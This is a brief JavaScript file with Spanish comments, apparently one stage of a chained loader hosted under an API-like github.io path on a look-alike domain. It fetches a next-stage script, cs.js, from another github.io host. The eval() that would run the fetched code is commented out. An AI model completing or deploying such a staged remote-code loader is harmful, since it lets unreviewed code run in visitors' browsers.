// Contenido para: https://www-globalservice.github.io/api/v2/0193344311.js

(async () => {
    try {
        const urlSiguiente = 'https://moc3pnj.github.io/api/cs.js';
        const respuesta = await fetch(urlSiguiente);
        
        if (!respuesta.ok) {
            console.error(`ERROR (v2): No se pudo conectar con ${urlSiguiente}. Estado HTTP: ${respuesta.status}.`);
            document.body.innerHTML = `<h1>❌ Error de Conexión: ${urlSiguiente} no accesible (${respuesta.status}).</h1><p>Asegúrate de que el siguiente eslabón de la cadena esté funcionando.</p>`;
            return; // Detener la ejecución en caso de error de conexión
        }
        
        const contenido = await respuesta.text();
        console.log('✅ Contenido obtenido de cs.js.');
        // console.log(contenido); // Opcional: loguear el contenido del JS siguiente

        // ¡ADVERTENCIA!: Usar eval() con contenido no confiable es un riesgo de seguridad.
        // eval(contenido); 

    } catch (error) {
        console.error(`ERROR (v2): Fallo al intentar obtener contenido de cs.js:`, error);
        document.body.innerHTML = `<h1>❌ Error de Conexión: Fallo de red al cargar cs.js.</h1><p>Verifica tu conexión a internet o la disponibilidad del servidor.</p>`;
    }
})();

